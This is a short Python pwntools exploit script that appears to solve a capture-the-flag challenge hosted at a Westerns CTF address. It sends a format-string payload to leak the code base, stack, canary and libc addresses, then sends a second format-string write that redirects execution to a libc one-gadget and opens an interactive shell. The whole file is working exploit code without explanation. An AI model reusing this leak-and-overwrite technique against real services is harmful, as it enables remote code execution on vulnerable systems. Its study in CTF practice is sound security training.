#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.26"
port = 8888
host = "printf.chal.ctf.westerns.tokyo"
port = 10001
context.arch = "amd64"    
r = remote(host,port)
r.recvuntil("?")
payload = "%x"*0x26 +'b'*8 + "%llx|"*0x10 +'%llx|'*5 + "#" + "%llx|" + "%100c"
print len(payload)
r.sendline(payload)
r.recvuntil("b"*8)
code = int(r.recvuntil("|")[:-1],16) - 0xd0
print "code:",hex(code)
stack = int(r.recvuntil("|")[:-1],16) 
print "stack:",hex(stack)
canary = int(r.recvuntil("|")[:-1],16)
print "canary:",hex(canary)
r.recvuntil("|")
libc = int(r.recvuntil("|")[:-1],16) - 0x26b6b
print "libc:",hex(libc)
r.recvuntil("#")
cur_stack = stack - 0x380
mmap = int(r.recvuntil("|")[:-1],16)  - 0x190
lddata = mmap -0x1000
fuck = lddata + 0xf60
print "lddata:",hex(lddata)
print "cur_stack:",hex(cur_stack)
nb = cur_stack - fuck -23  
magic = libc + 0x106f04
print hex(magic)
payload = '%' + str(nb) + 'c' + 'x'*(39) + p64(magic)
r.recvuntil("comment?")
r.sendline(payload)
r.interactive()


